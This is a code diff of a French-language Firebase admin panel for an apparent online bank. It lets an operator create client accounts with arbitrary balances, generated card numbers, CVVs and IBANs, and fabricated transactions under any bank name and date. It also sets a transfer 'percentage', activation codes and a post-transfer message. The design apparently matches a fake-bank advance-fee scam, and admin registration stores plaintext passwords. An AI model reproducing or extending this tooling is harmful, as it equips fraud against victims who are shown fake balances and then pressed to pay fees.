@@ -46,9 +46,6 @@ let isCardDetailsVisible = false;
 let isIbanVisible = false;
 let currentTransferTab = 'completed';
 
-// ============================================================
-// DONNÉES PAYS
-// ============================================================
 const COUNTRY_LIST = [
     { name: "Afghanistan", flag: "🇦🇫" }, { name: "Afrique du Sud", flag: "🇿🇦" },
     { name: "Albanie", flag: "🇦🇱" }, { name: "Algérie", flag: "🇩🇿" },
@@ -133,9 +130,6 @@ const COUNTRY_LIST = [
     { name: "Zimbabwe", flag: "🇿🇼" }
 ];
 
-// ============================================================
-// LISTE DES DEVISES ÉTENDUE
-// ============================================================
 const CURRENCY_LIST = [
     { value: "zł", label: "zł - Zloty polonais", group: "🌍 Devises principales" },
     { value: "€", label: "€ - Euro", group: "🌍 Devises principales" },
@@ -281,7 +275,7 @@ const CURRENCY_LIST = [
     { value: "XPF", label: "₣ - Franc pacifique (XPF)", group: "🌊 Océanie" }
 ];
 
-// ✅ CORRIGÉ : 15 langues (correspond à script.js)
+// ✅ 40 LANGUES
 const LANGUAGE_LIST = [
     { value: "fr", label: "Français" },
     { value: "en", label: "English" },
@@ -297,12 +291,34 @@ const LANGUAGE_LIST = [
     { value: "ja", label: "日本語" },
     { value: "tr", label: "Türkçe" },
     { value: "ko", label: "한국어" },
-    { value: "vi", label: "Tiếng Việt" }
+    { value: "vi", label: "Tiếng Việt" },
+    { value: "hi", label: "हिन्दी" },
+    { value: "bn", label: "বাংলা" },
+    { value: "ur", label: "اردو" },
+    { value: "fa", label: "فارسی" },
+    { value: "id", label: "Bahasa Indonesia" },
+    { value: "th", label: "ไทย" },
+    { value: "ms", label: "Bahasa Melayu" },
+    { value: "sw", label: "Kiswahili" },
+    { value: "el", label: "Ελληνικά" },
+    { value: "he", label: "עברית" },
+    { value: "uk", label: "Українська" },
+    { value: "ro", label: "Română" },
+    { value: "hu", label: "Magyar" },
+    { value: "sv", label: "Svenska" },
+    { value: "no", label: "Norsk" },
+    { value: "da", label: "Dansk" },
+    { value: "fi", label: "Suomi" },
+    { value: "cs", label: "Čeština" },
+    { value: "sk", label: "Slovenčina" },
+    { value: "hr", label: "Hrvatski" },
+    { value: "bg", label: "Български" },
+    { value: "sr", label: "Српски" },
+    { value: "af", label: "Afrikaans" },
+    { value: "am", label: "አማርኛ" },
+    { value: "ha", label: "Hausa" }
 ];
 
-// ============================================================
-// UTILITAIRES
-// ============================================================
 function showToast(message, type = 'success') {
     const toast = document.createElement('div');
     toast.className = 'toast ' + type;
@@ -429,9 +445,6 @@ function generateIbanDetails() {
     return { iban, swift };
 }
 
-// ============================================================
-// GESTION DES ÉCRANS
-// ============================================================
 function showScreen(screenId) {
     document.querySelectorAll('.auth-screen').forEach(s => s.classList.remove('active'));
     const screen = document.getElementById(screenId);
@@ -454,12 +467,8 @@ function showAdminPanel() {
     showScreen('admin-panel-screen');
 }
 
-// ============================================================
-// AUTHENTIFICATION - INSCRIPTION
-// ============================================================
 async function handleAdminRegister(event) {
     event.preventDefault();
-
     const name = document.getElementById('register-admin-name').value.trim();
     const email = document.getElementById('register-admin-email').value.trim().toLowerCase();
     const password = document.getElementById('register-admin-password').value;
@@ -470,7 +479,6 @@ async function handleAdminRegister(event) {
     if (!email.includes('@') || !email.includes('.')) return errorEl.textContent = 'Adresse e-mail invalide.';
     if (password.length < 6) return errorEl.textContent = 'Le mot de passe doit contenir au moins 6 caractères.';
     if (password !== confirm) return errorEl.textContent = 'Les mots de passe ne correspondent pas.';
-
     errorEl.textContent = '';
 
     const submitBtn = document.querySelector('#admin-register-form .auth-btn-primary');
@@ -481,29 +489,20 @@ async function handleAdminRegister(event) {
     try {
         const userCredential = await createUserWithEmailAndPassword(auth, email, password);
         const user = userCredential.user;
-
         await updateProfile(user, { displayName: name });
-
         await setDoc(doc(db, ADMINS_COLLECTION, user.uid), {
-            uid: user.uid,
-            name: name,
-            email: email,
-            plainPassword: password,
-            blocked: false,
-            createdAt: new Date().toISOString(),
-            createdAtServer: serverTimestamp()
+            uid: user.uid, name: name, email: email, plainPassword: password,
+            blocked: false, createdAt: new Date().toISOString(), createdAtServer: serverTimestamp()
         });
-
         showToast('Compte créé avec succès ! Bienvenue ' + name, 'success');
         document.getElementById('admin-register-form').reset();
-
     } catch (err) {
         console.error('Erreur inscription :', err);
         let msg = 'Erreur lors de la création du compte.';
         if (err.code === 'auth/email-already-in-use') msg = 'Cet email est déjà utilisé.';
         else if (err.code === 'auth/invalid-email') msg = 'Adresse e-mail invalide.';
         else if (err.code === 'auth/weak-password') msg = 'Mot de passe trop faible.';
-        else if (err.code === 'auth/network-request-failed') msg = 'Erreur réseau, vérifiez votre connexion.';
+        else if (err.code === 'auth/network-request-failed') msg = 'Erreur réseau.';
         errorEl.textContent = msg;
     } finally {
         submitBtn.disabled = false;
@@ -511,18 +510,13 @@ async function handleAdminRegister(event) {
     }
 }
 
-// ============================================================
-// AUTHENTIFICATION - CONNEXION
-// ============================================================
 async function handleAdminLogin(event) {
     event.preventDefault();
-
     const email = document.getElementById('login-admin-email').value.trim().toLowerCase();
     const password = document.getElementById('login-admin-password').value;
     const errorEl = document.getElementById('login-admin-error');
 
     if (!email || !password) return errorEl.textContent = 'Veuillez remplir tous les champs.';
-
     errorEl.textContent = '';
 
     const submitBtn = document.querySelector('#admin-login-form .auth-btn-primary');
@@ -533,7 +527,6 @@ async function handleAdminLogin(event) {
     try {
         const userCredential = await signInWithEmailAndPassword(auth, email, password);
         const user = userCredential.user;
-        
         const adminDoc = await getDoc(doc(db, ADMINS_COLLECTION, user.uid));
         if (adminDoc.exists() && adminDoc.data().blocked === true) {
             await signOut(auth);
@@ -549,8 +542,8 @@ async function handleAdminLogin(event) {
         else if (err.code === 'auth/wrong-password') msg = 'Mot de passe incorrect.';
         else if (err.code === 'auth/invalid-credential') msg = 'Email ou mot de passe incorrect.';
         else if (err.code === 'auth/invalid-email') msg = 'Adresse e-mail invalide.';
-        else if (err.code === 'auth/network-request-failed') msg = 'Erreur réseau, vérifiez votre connexion.';
-        else if (err.code === 'auth/too-many-requests') msg = 'Trop de tentatives. Veuillez réessayer plus tard.';
+        else if (err.code === 'auth/network-request-failed') msg = 'Erreur réseau.';
+        else if (err.code === 'auth/too-many-requests') msg = 'Trop de tentatives.';
         errorEl.textContent = msg;
     } finally {
         submitBtn.disabled = false;
@@ -558,19 +551,12 @@ async function handleAdminLogin(event) {
     }
 }
 
-// ============================================================
-// DÉCONNEXION
-// ============================================================
 async function handleAdminLogout() {
     const isConfirmed = await showConfirmModal({
-        title: 'Déconnexion',
-        message: 'Voulez-vous vraiment vous déconnecter ?',
-        confirmText: 'Se déconnecter',
-        type: 'primary'
+        title: 'Déconnexion', message: 'Voulez-vous vraiment vous déconnecter ?',
+        confirmText: 'Se déconnecter', type: 'primary'
     });
-
     if (!isConfirmed) return;
-
     try {
         await signOut(auth);
         showToast('Déconnexion réussie.', 'info');
@@ -580,55 +566,34 @@ async function handleAdminLogout() {
     }
 }
 
-// ============================================================
-// CHARGEMENT DU PROFIL ADMIN
-// ============================================================
 async function loadAdminProfile(user) {
     try {
         const adminDoc = await getDoc(doc(db, ADMINS_COLLECTION, user.uid));
-        
         if (adminDoc.exists() && adminDoc.data().blocked === true) {
             await signOut(auth);
             return;
         }
+        if (adminDoc.exists()) currentAdmin = adminDoc.data();
+        else currentAdmin = { uid: user.uid, name: user.displayName || 'Admin', email: user.email };
 
-        if (adminDoc.exists()) {
-            currentAdmin = adminDoc.data();
-        } else {
-            currentAdmin = {
-                uid: user.uid,
-                name: user.displayName || 'Admin',
-                email: user.email
-            };
-        }
-
-        const initials = (currentAdmin.name || 'A').split(' ')
-            .map(w => w[0]).slice(0, 2).join('').toUpperCase() || 'A';
+        const initials = (currentAdmin.name || 'A').split(' ').map(w => w[0]).slice(0, 2).join('').toUpperCase() || 'A';
         document.getElementById('admin-avatar').textContent = initials;
         document.getElementById('admin-user-name').textContent = currentAdmin.name || 'Admin';
         document.getElementById('admin-user-email').textContent = currentAdmin.email || '';
         document.getElementById('admin-header-subtitle').textContent = `Bienvenue, ${currentAdmin.name}`;
-    } catch (err) {
-        console.error('Erreur chargement profil admin :', err);
-    }
+    } catch (err) { console.error('Erreur profil admin :', err); }
 }
 
-// ============================================================
-// ÉCOUTE DE L'ÉTAT D'AUTHENTIFICATION
-// ============================================================
 function initAuthListener() {
     showScreen('admin-loading-screen');
-
     onAuthStateChanged(auth, async (user) => {
         if (user && !user.isAnonymous) {
-            console.log('👤 Admin connecté :', user.email);
             await loadAdminProfile(user);
             if (auth.currentUser) {
                 showAdminPanel();
                 await loadClients();
             }
         } else {
-            console.log('🔒 Aucune session active');
             currentAdmin = null;
             allClients = [];
             showLoginScreen();
@@ -636,9 +601,6 @@ function initAuthListener() {
     });
 }
 
-// ============================================================
-// GESTION DU MENU DÉROULANT PERSONNALISÉ
-// ============================================================
 function initCustomSelect() {
     const selectWrapper = document.getElementById('custom-option-select');
     const trigger = document.getElementById('custom-option-trigger');
@@ -646,7 +608,6 @@ function initCustomSelect() {
     const hiddenInput = document.getElementById('m-select-option');
     const triggerText = document.getElementById('custom-option-text');
     const triggerIcon = document.querySelector('.custom-select-icon i');
-
     if (!selectWrapper || !trigger || !dropdown) return;
 
     trigger.addEventListener('click', (e) => {
@@ -657,32 +618,22 @@ function initCustomSelect() {
     dropdown.querySelectorAll('.custom-option').forEach(option => {
         option.addEventListener('click', (e) => {
             e.stopPropagation();
-
             const value = option.dataset.value;
             const label = option.querySelector('span').textContent.trim();
             const iconClass = option.querySelector('i').className;
-
             triggerText.textContent = label;
             triggerText.classList.remove('placeholder');
-            if (triggerIcon) {
-                triggerIcon.className = iconClass;
-            }
-
+            if (triggerIcon) triggerIcon.className = iconClass;
             hiddenInput.value = value;
-
             dropdown.querySelectorAll('.custom-option').forEach(o => o.classList.remove('selected'));
             option.classList.add('selected');
-
             selectWrapper.classList.remove('open');
-
             handleOptionChange();
         });
     });
 
     document.addEventListener('click', (e) => {
-        if (!selectWrapper.contains(e.target)) {
-            selectWrapper.classList.remove('open');
-        }
+        if (!selectWrapper.contains(e.target)) selectWrapper.classList.remove('open');
     });
 }
 
@@ -691,14 +642,8 @@ function resetCustomSelect() {
     const triggerText = document.getElementById('custom-option-text');
     const triggerIcon = document.querySelector('.custom-select-icon i');
     const hiddenInput = document.getElementById('m-select-option');
-
-    if (triggerText) {
-        triggerText.textContent = '-- Choisir une option --';
-        triggerText.classList.add('placeholder');
-    }
-    if (triggerIcon) {
-        triggerIcon.className = 'fa-solid fa-list';
-    }
+    if (triggerText) { triggerText.textContent = '-- Choisir une option --'; triggerText.classList.add('placeholder'); }
+    if (triggerIcon) triggerIcon.className = 'fa-solid fa-list';
     if (hiddenInput) hiddenInput.value = '';
     if (selectWrapper) {
         selectWrapper.classList.remove('open');
@@ -706,15 +651,10 @@ function resetCustomSelect() {
     }
 }
 
-// ============================================================
-// BANQUES
-// ============================================================
 function populateBankSelect(selectId, clientCountry, selectedDomain) {
     const select = document.getElementById(selectId);
     if (!select) return;
-
     select.innerHTML = '<option value="">-- Sélectionner une banque --</option>';
-
     const countryBanks = BANKS_BY_COUNTRY[clientCountry] || [];
     if (countryBanks.length > 0) {
         const group = document.createElement('optgroup');
@@ -730,7 +670,6 @@ function populateBankSelect(selectId, clientCountry, selectedDomain) {
         });
         select.appendChild(group);
     }
-
     Object.entries(BANKS_BY_COUNTRY).forEach(([country, banks]) => {
         if (country === clientCountry) return;
         const group = document.createElement('optgroup');
@@ -748,16 +687,9 @@ function populateBankSelect(selectId, clientCountry, selectedDomain) {
     });
 }
 
-// ============================================================
-// CRÉATION D'UN CLIENT
-// ============================================================
 async function handleCreateClient(event) {
     event.preventDefault();
-
-    if (!currentAdmin) {
-        showToast('Vous devez être connecté pour créer un client.', 'error');
-        return;
-    }
+    if (!currentAdmin) { showToast('Vous devez être connecté pour créer un client.', 'error'); return; }
 
     const lastName = document.getElementById('c-lastname').value.trim();
     const firstName = document.getElementById('c-firstname').value.trim();
@@ -777,10 +709,8 @@ async function handleCreateClient(event) {
     const pin = document.getElementById('c-pin').value.trim();
     const activationCode = document.getElementById('c-activation').value.trim();
     const percentValue = parseInt(document.getElementById('c-percent-value').value, 10);
-    
     const pendingTransferRadio = document.querySelector('input[name="c-pending-transfer"]:checked');
     const pendingTransferEnabled = pendingTransferRadio ? pendingTransferRadio.value === 'true' : false;
-
     const messageAfterTransfer = document.getElementById('c-message').value.trim();
     const color = document.getElementById('c-color').value;
 
@@ -791,9 +721,7 @@ async function handleCreateClient(event) {
     if (!bankDomain || !bankName) return showToast('Veuillez sélectionner une banque.', 'error');
     if (!/^\d{4,8}$/.test(pin)) return showToast('Le code PIN doit contenir 4 à 8 chiffres.', 'error');
     if (activationCode.length < 4) return showToast("Le code d'activation doit contenir au moins 4 caractères.", 'error');
-    if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) {
-        return showToast('Le pourcentage doit être entre 0 et 100.', 'error');
-    }
+    if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) return showToast('Le pourcentage doit être entre 0 et 100.', 'error');
     if (!messageAfterTransfer) return showToast('Le message après virement est obligatoire.', 'error');
     if (!color) return showToast('Veuillez choisir une couleur.', 'error');
 
@@ -818,42 +746,19 @@ async function handleCreateClient(event) {
         const initialTransactions = [];
         if (balance > 0) {
             const now = new Date();
-            const dateStr = now.toLocaleDateString('fr-FR') + ' • ' +
-                now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
-            initialTransactions.push({
-                type: 'credit',
-                title: 'Solde initial',
-                date: dateStr,
-                amount: balance,
-                bankName: bankName,
-                bankDomain: bankDomain,
-                bankLogo: bankLogo
-            });
+            const dateStr = now.toLocaleDateString('fr-FR') + ' • ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
+            initialTransactions.push({ type: 'credit', title: 'Solde initial', date: dateStr, amount: balance, bankName, bankDomain, bankLogo });
         }
 
         const clientData = {
-            id: clientId,
-            lastName, firstName, country, countryFlag,
-            address, email, phone, language,
-            balance, currency, pin, activationCode,
-            percentValue, pendingTransferEnabled, messageAfterTransfer, color,
+            id: clientId, lastName, firstName, country, countryFlag, address, email, phone, language,
+            balance, currency, pin, activationCode, percentValue, pendingTransferEnabled, messageAfterTransfer, color,
             bankName, bankDomain, bankLogo,
-            cardNumber: newCard.cardNumber, 
-            cardCVV: newCard.cvv,
-            cardExpiry: newCard.expiry,
-            canViewCardDetails: false,
-            iban: newIban.iban,
-            swift: newIban.swift,
-            canViewIban: false,
-            transactions: initialTransactions,
-            blocked: false,
-            bigCardColor: '#ffffff',
-            connectionLogs: [], 
-            createdBy: currentAdmin.uid,
-            createdByName: currentAdmin.name,
-            createdByEmail: currentAdmin.email,
-            createdAt: new Date().toISOString(),
-            createdAtServer: serverTimestamp()
+            cardNumber: newCard.cardNumber, cardCVV: newCard.cvv, cardExpiry: newCard.expiry, canViewCardDetails: false,
+            iban: newIban.iban, swift: newIban.swift, canViewIban: false,
+            transactions: initialTransactions, blocked: false, bigCardColor: '#ffffff', connectionLogs: [],
+            createdBy: currentAdmin.uid, createdByName: currentAdmin.name, createdByEmail: currentAdmin.email,
+            createdAt: new Date().toISOString(), createdAtServer: serverTimestamp()
         };
 
         await setDoc(doc(db, COLLECTION_NAME, clientId), clientData);
@@ -1024,9 +929,7 @@ function openClientDetail(clientId) {
 
     document.getElementById('client-detail-modal').classList.add('show');
 }
-// ============================================================
-// FERMETURE DU MODAL CLIENT
-// ============================================================
+
 function closeClientDetail() {
     document.getElementById('client-detail-modal').classList.remove('show');
     currentDetailClient = null;
@@ -1096,9 +999,6 @@ function editClientFromDetail() {
     selectClientForModify(clientId);
 }
 
-// ============================================================
-// GESTION DES CONNEXIONS (MODALE)
-// ============================================================
 window.openConnectionDetailsModal = function() {
     if (!currentDetailClient) return;
 
@@ -1106,9 +1006,7 @@ window.openConnectionDetailsModal = function() {
     const location = currentDetailClient.lastKnownLocation || {};
 
     const deviceCountEl = document.getElementById('conn-device-count');
-    if (deviceCountEl) {
-        deviceCountEl.textContent = `${logs.length} appareil(s) connecté(s)`;
-    }
+    if (deviceCountEl) deviceCountEl.textContent = `${logs.length} appareil(s) connecté(s)`;
 
     const deviceListEl = document.getElementById('conn-device-list');
     if (deviceListEl) {
@@ -1141,9 +1039,6 @@ window.closeConnectionDetailsModal = function() {
     document.getElementById('connection-details-modal').classList.remove('show');
 };
 
-// ============================================================
-// GESTION DES VIREMENTS (MODALE ET ACTIONS)
-// ============================================================
 window.openTransferDetailsModal = function(tab) {
     if (!currentDetailClient) return;
     currentTransferTab = tab;
@@ -1334,7 +1229,7 @@ window.handleAdminValidateTransfer = async function(index) {
 };
 
 // ============================================================
-// ENVOI DES EMAILS (ADMIN)
+// ENVOI DES EMAILS
 // ============================================================
 async function handleSendLoginCredentials() {
     if (!currentDetailClient) return;
@@ -1354,19 +1249,13 @@ async function handleSendLoginCredentials() {
 
     try {
         const result = await sendLoginCredentials(client);
-        if (result.success) {
-            showToast('Identifiants envoyés à ' + client.email, 'success');
-        } else {
-            showToast('Erreur d\'envoi : ' + (result.error || 'inconnue'), 'error');
-        }
+        if (result.success) showToast('Identifiants envoyés à ' + client.email, 'success');
+        else showToast('Erreur d\'envoi : ' + (result.error || 'inconnue'), 'error');
     } catch (err) {
         console.error('Erreur envoi identifiants :', err);
         showToast('Erreur d\'envoi. Réessayez.', 'error');
     } finally {
-        if (btn) {
-            btn.disabled = false;
-            btn.innerHTML = originalHTML;
-        }
+        if (btn) { btn.disabled = false; btn.innerHTML = originalHTML; }
     }
 }
 
@@ -1388,25 +1277,16 @@ async function handleSendActivationCode() {
 
     try {
         const result = await sendActivationCode(client);
-        if (result.success) {
-            showToast('Code d\'activation envoyé à ' + client.email, 'success');
-        } else {
-            showToast('Erreur d\'envoi : ' + (result.error || 'inconnue'), 'error');
-        }
+        if (result.success) showToast('Code d\'activation envoyé à ' + client.email, 'success');
+        else showToast('Erreur d\'envoi : ' + (result.error || 'inconnue'), 'error');
     } catch (err) {
         console.error('Erreur envoi code d\'activation :', err);
         showToast('Erreur d\'envoi. Réessayez.', 'error');
     } finally {
-        if (btn) {
-            btn.disabled = false;
-            btn.innerHTML = originalHTML;
-        }
+        if (btn) { btn.disabled = false; btn.innerHTML = originalHTML; }
     }
 }
 
-// ============================================================
-// COPIER UN CHAMP
-// ============================================================
 window.copyField = function (elementId, isInput = false) {
     const el = document.getElementById(elementId);
     if (!el) return;
@@ -1418,10 +1298,7 @@ window.copyField = function (elementId, isInput = false) {
             const original = btn.innerHTML;
             btn.classList.add('copied');
             btn.innerHTML = '<i class="fa-solid fa-check"></i>';
-            setTimeout(() => {
-                btn.classList.remove('copied');
-                btn.innerHTML = original;
-            }, 1500);
+            setTimeout(() => { btn.classList.remove('copied'); btn.innerHTML = original; }, 1500);
         }
         showToast('Copié !', 'success');
     };
@@ -1475,9 +1352,6 @@ function handleModifyClientChange() {
     optionWrapper.style.display = 'block';
 }
 
-// ============================================================
-// GESTION DE L'OPTION SÉLECTIONNÉE
-// ============================================================
 function handleOptionChange() {
     const optionValue = document.getElementById('m-select-option').value;
     selectedOption = optionValue;
@@ -1919,13 +1793,8 @@ function renderOptionCard(option, client) {
         });
     }
 
-    if (option === 'bank') {
-        populateBankSelect('opt-bank', client.country, client.bankDomain);
-    }
-
-    if (option === 'transaction') {
-        populateBankSelect('opt-tx-bank', client.country);
-    }
+    if (option === 'bank') populateBankSelect('opt-bank', client.country, client.bankDomain);
+    if (option === 'transaction') populateBankSelect('opt-tx-bank', client.country);
 
     if (option === 'access') {
         const btn = document.getElementById('opt-access-btn');
@@ -1961,18 +1830,12 @@ function renderOptionCard(option, client) {
     }
 }
 
-// ============================================================
-// ANNULER LA CARTE D'OPTION
-// ============================================================
 function cancelOptionCard() {
     resetCustomSelect();
     document.getElementById('option-card-container').innerHTML = '';
     selectedOption = null;
 }
 
-// ============================================================
-// SAUVEGARDE CIBLÉE PAR OPTION
-// ============================================================
 async function saveOption(option, client) {
     const btn = document.getElementById('opt-save-btn');
     const originalHTML = btn.innerHTML;
@@ -1989,29 +1852,22 @@ async function saveOption(option, client) {
                 const country = document.getElementById('opt-country').value;
                 const countryFlag = document.querySelector('#opt-country option:checked')?.dataset.flag || '';
                 const address = document.getElementById('opt-address').value.trim();
-
                 if (!lastName || !firstName) throw new Error('Nom et prénom obligatoires.');
                 if (!country) throw new Error('Pays obligatoire.');
-
                 updatedData = { ...updatedData, lastName, firstName, country, countryFlag, address };
                 break;
             }
-
             case 'contact': {
                 const email = document.getElementById('opt-email').value.trim().toLowerCase();
                 const phone = document.getElementById('opt-phone').value.trim();
-
                 if (!email.includes('@') || !email.includes('.')) throw new Error('Adresse e-mail invalide.');
-
                 const emailCheck = query(collection(db, COLLECTION_NAME), where('email', '==', email));
                 const existing = await getDocs(emailCheck);
                 const taken = existing.docs.some(d => d.id !== selectedClientId);
                 if (taken) throw new Error('Cet e-mail est utilisé par un autre client.');
-
                 updatedData = { ...updatedData, email, phone };
                 break;
             }
-
             case 'account': {
                 const balance = parseFloat(document.getElementById('opt-balance').value) || 0;
                 const currency = document.getElementById('opt-currency').value;
@@ -2019,96 +1875,72 @@ async function saveOption(option, client) {
                 updatedData = { ...updatedData, balance, currency, language };
                 break;
             }
-
             case 'bank': {
                 const bankSelect = document.getElementById('opt-bank');
                 const bankDomain = bankSelect.value;
                 const bankOpt = bankSelect.options[bankSelect.selectedIndex];
                 const bankName = bankOpt?.dataset.bankName || '';
-
                 if (!bankDomain || !bankName) throw new Error('Veuillez sélectionner une banque.');
-
                 const bankLogo = getBankLogoUrl(bankDomain);
                 updatedData = { ...updatedData, bankName, bankDomain, bankLogo };
                 break;
             }
-
             case 'security': {
                 const pin = document.getElementById('opt-pin').value.trim();
                 const activationCode = document.getElementById('opt-activation').value.trim();
-
                 if (!/^\d{4,8}$/.test(pin)) throw new Error('Le code PIN doit contenir 4 à 8 chiffres.');
                 if (activationCode.length < 4) throw new Error("Le code d'activation doit contenir au moins 4 caractères.");
-
                 updatedData = { ...updatedData, pin, activationCode };
                 break;
             }
-
             case 'card_info': {
                 const cardNumber = document.getElementById('opt-card-number').value.trim();
                 const cardExpiry = document.getElementById('opt-card-expiry').value.trim();
                 const cardCVV = document.getElementById('opt-card-cvv').value.trim();
-                
                 const visibilityRadio = document.querySelector('input[name="card-visibility"]:checked');
                 const canViewCardDetails = visibilityRadio ? visibilityRadio.value === 'shown' : false;
-
                 if (cardNumber.length < 15) throw new Error('Numéro de carte invalide.');
                 if (cardExpiry.length < 4) throw new Error('Date d\'expiration invalide.');
                 if (cardCVV.length < 3) throw new Error('CVV invalide.');
-
                 updatedData = { ...updatedData, cardNumber, cardExpiry, cardCVV, canViewCardDetails };
                 break;
             }
-
             case 'iban_info': {
                 const iban = document.getElementById('opt-iban').value.trim();
                 const swift = document.getElementById('opt-swift').value.trim();
-                
                 const visibilityRadio = document.querySelector('input[name="iban-visibility"]:checked');
                 const canViewIban = visibilityRadio ? visibilityRadio.value === 'shown' : false;
-
                 if (iban.length < 10) throw new Error('Numéro IBAN invalide.');
                 if (swift.length < 8) throw new Error('Code SWIFT invalide.');
-
                 updatedData = { ...updatedData, iban, swift, canViewIban };
                 break;
             }
-
             case 'transfer_params': {
                 const percentValue = parseInt(document.getElementById('opt-percent').value, 10);
                 const messageAfterTransfer = document.getElementById('opt-message').value.trim();
-
-                if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) {
-                    throw new Error('Le pourcentage doit être entre 0 et 100.');
-                }
+                if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) throw new Error('Le pourcentage doit être entre 0 et 100.');
                 if (!messageAfterTransfer) throw new Error('Le message est obligatoire.');
-
                 updatedData = { ...updatedData, percentValue, messageAfterTransfer };
                 break;
             }
-
             case 'pending_transfer': {
                 const pendingRadio = document.querySelector('input[name="pending-transfer-visibility"]:checked');
                 const pendingTransferEnabled = pendingRadio ? pendingRadio.value === 'true' : false;
-
                 updatedData = { ...updatedData, pendingTransferEnabled };
                 break;
             }
-
             case 'color': {
                 const color = document.getElementById('opt-color').value;
                 if (!color) throw new Error('Veuillez choisir une couleur.');
                 updatedData = { ...updatedData, color };
                 break;
             }
-
             case 'big_card_color': {
                 const bigCardColor = document.getElementById('opt-big-card-color').value;
                 if (!bigCardColor) throw new Error('Veuillez choisir une couleur.');
                 updatedData = { ...updatedData, bigCardColor };
                 break;
             }
-
             case 'reset': {
                 const isConfirmed = await showConfirmModal({
                     title: 'Réinitialiser le compte',
@@ -2116,17 +1948,10 @@ async function saveOption(option, client) {
                     confirmText: 'Réinitialiser',
                     type: 'danger'
                 });
-
-                if (!isConfirmed) {
-                    btn.disabled = false;
-                    btn.innerHTML = originalHTML;
-                    return;
-                }
-
+                if (!isConfirmed) { btn.disabled = false; btn.innerHTML = originalHTML; return; }
                 updatedData = { ...updatedData, balance: 0, transactions: [] };
                 break;
             }
-
             case 'transaction': {
                 const amount = parseFloat(document.getElementById('opt-tx-amount').value);
                 const type = document.getElementById('opt-tx-type').value;
@@ -2135,33 +1960,21 @@ async function saveOption(option, client) {
                 const bankDomain = bankSelect.value;
                 const selectedBankOpt = bankSelect.options[bankSelect.selectedIndex];
                 const bankName = selectedBankOpt?.dataset.bankName || '';
-
                 if (!amount || amount <= 0) throw new Error('Montant invalide.');
                 if (!bankDomain || !bankName) throw new Error('Veuillez sélectionner une banque.');
-
                 const finalAmount = type === 'credit' ? amount : -amount;
                 const now = new Date();
-                const dateStr = dateInput || (now.toLocaleDateString('fr-FR') + ' • ' +
-                    now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }));
-
+                const dateStr = dateInput || (now.toLocaleDateString('fr-FR') + ' • ' + now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }));
                 const newTx = {
-                    type: type,
-                    title: bankName,
-                    date: dateStr,
-                    amount: finalAmount,
-                    bankName: bankName,
-                    bankDomain: bankDomain,
-                    bankLogo: getBankLogoUrl(bankDomain)
+                    type: type, title: bankName, date: dateStr, amount: finalAmount,
+                    bankName: bankName, bankDomain: bankDomain, bankLogo: getBankLogoUrl(bankDomain)
                 };
-
                 const transactions = (client.transactions || []).slice();
                 transactions.unshift(newTx);
                 const newBalance = (Number(client.balance) || 0) + finalAmount;
-
                 updatedData = { ...updatedData, balance: newBalance, transactions };
                 break;
             }
-
             default:
                 throw new Error('Option non reconnue.');
         }
@@ -2184,9 +1997,6 @@ async function saveOption(option, client) {
     }
 }
 
-// ============================================================
-// BLOQUER / DÉBLOQUER
-// ============================================================
 async function handleToggleAccess() {
     if (!selectedClientId) return;
     const client = allClients.find(c => c.id === selectedClientId);
@@ -2213,14 +2023,11 @@ async function handleToggleAccess() {
 
     try {
         await updateDoc(doc(db, COLLECTION_NAME, selectedClientId), { blocked: willBlock });
-
         const idx = allClients.findIndex(c => c.id === selectedClientId);
         if (idx !== -1) allClients[idx].blocked = willBlock;
-
         await loadClients();
         showToast(willBlock ? 'Accès bloqué.' : 'Accès débloqué.', 'success');
         cancelOptionCard();
-
     } catch (err) {
         console.error(err);
         showToast('Erreur lors du traitement.', 'error');
@@ -2229,9 +2036,6 @@ async function handleToggleAccess() {
     }
 }
 
-// ============================================================
-// SUPPRIMER / TOUT EFFACER
-// ============================================================
 async function deleteClient(id) {
     const client = allClients.find(c => c.id === id);
     if (!client) return;
@@ -2286,9 +2090,6 @@ async function clearAllClients() {
     }
 }
 
-// ============================================================
-// MODAL LIEN
-// ============================================================
 function closeModal() {
     document.getElementById('link-modal').classList.remove('show');
 }
@@ -2321,9 +2122,6 @@ function openGeneratedLink() {
     if (lastGeneratedLink) window.open(lastGeneratedLink, '_blank');
 }
 
-// ============================================================
-// EXPOSITION GLOBALE
-// ============================================================
 window.clearAllClients = clearAllClients;
 window.closeModal = closeModal;
 window.copyGeneratedLink = copyGeneratedLink;
@@ -2338,9 +2136,6 @@ window.handleAdminLogout = handleAdminLogout;
 window.handleSendLoginCredentials = handleSendLoginCredentials;
 window.handleSendActivationCode = handleSendActivationCode;
 
-// ============================================================
-// INITIALISATION
-// ============================================================
 document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('admin-login-form').addEventListener('submit', handleAdminLogin);
     document.getElementById('admin-register-form').addEventListener('submit', handleAdminRegister);
